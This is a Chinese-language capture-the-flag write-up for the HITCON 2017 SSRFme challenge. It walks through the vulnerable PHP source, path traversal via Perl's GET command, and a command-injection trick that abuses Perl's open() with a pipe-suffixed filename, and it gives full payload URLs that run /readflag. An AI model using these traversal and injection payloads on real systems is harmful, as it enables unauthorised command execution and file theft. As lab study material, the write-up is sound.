# [HITCON 2017]SSRFme

[题目地址](https://buuoj.cn/challenges#[HITCON%202017]SSRFme)

最喜欢这种php题了，知识点非常明确而且好学。但是php题的考点为什么是perl命令执行漏洞啊？

```php
<?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }
    //输出这个地址是为了我们好了解到sandbox下的地址
    echo $_SERVER["REMOTE_ADDR"];
    //虽然没有明确给出sandbox的地址，但是根据md5(orange+REMOTE_ADDR)就能自己构建出地址了
    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);
    //执行命令“GET url”，注意这个GET命令是perl的
    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    //info是文件路径信息数组
    $info = pathinfo($_GET["filename"]);
    //如果有目录就取出目录
    $dir  = str_replace(".", "", basename($info["dirname"]));
    //在目录处建文件夹并切换目录
    @mkdir($dir);
    @chdir($dir);
    //把GET命令的执行结果放入文件名指定文件中，如果没有文件就在指定目录下创建新文件
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
```

简述程序的逻辑就是，程序帮我们执行命令`GET url`，然后把执行结果写入filename对应的文件中。我们可以先看看服务器的根目录有什么。

- http://8559cd8f-37cf-43d0-9411-d39ee5c8dad3.node4.buuoj.cn:81/?url=../../../../../../../&filename=a

然后根据自己ip找到沙盒地址，读取a文件内容。

- http://8559cd8f-37cf-43d0-9411-d39ee5c8dad3.node4.buuoj.cn:81/sandbox/2eeed2f9aeae6311b507ada8fb98809e/a

发现目录下有个flag和readflag。本来想着直接让`url=../../../../../../../flag&filename=b`读flag的，结果查看b文件发现是空的。有点疑惑，不信邪，继续用同样的方法搞了个readflag。

- http://8559cd8f-37cf-43d0-9411-d39ee5c8dad3.node4.buuoj.cn:81/?url=../../../../../../../readflag&filename=b

访问b还真的下载下来了。文件是elf，不务正业反编译了一波，没啥看的，里面就是打开flag文件然后输出，不知道为啥flag下载不了readflag却可以。这下没招了，最开始不知道GET命令是perl的，自然不懂如何利用，直到看了[wp](https://blog.csdn.net/qq_45521281/article/details/105868449)，你是perl的命令啊？想想也是，[shell_exec](https://www.php.net/manual/zh/function.shell-exec.php)通过shell执行命令，shell里面装了perl很正常吧？顺便放个pathinfo的[链接](https://www.runoob.com/php/func-filesystem-pathinfo.html)。

这个漏洞起源于perl的GET命令源码里调用了open函数。在perl下，如果open的第二个参数（path）可控，我们就能进行任意代码执行。巧了吗这不是，GET url里面的url就会被传入path。像下面这样就可以命令执行：

```
touch 'id|'
GET 'file:id|'

uid=0(root) gid=0(root) groups=0(root)
```

第一句`touch 'id|'`，创建一个名为`id|`的文件，这个命令执行漏洞触发的前提是文件存在。之后用`GET 'file:id|'`就能指定id这个命令了，管道符`|`在前在后都行。于是就有payload：

- http://8559cd8f-37cf-43d0-9411-d39ee5c8dad3.node4.buuoj.cn:81/?filename=bash%20-c%20/readflag|&url=

第一次payload的url填不填都行，主要是创建出文件。第二次才是执行时间。

- http://8559cd8f-37cf-43d0-9411-d39ee5c8dad3.node4.buuoj.cn:81/?filename=b&url=file:bash%20-c%20/readflag|

现在访问沙盒下的b文件就能得到flag了。perl的GET命令执行漏洞用起来非常简单，只需要`GET 命令|`就行，前提是名为`命令|`的文件存在。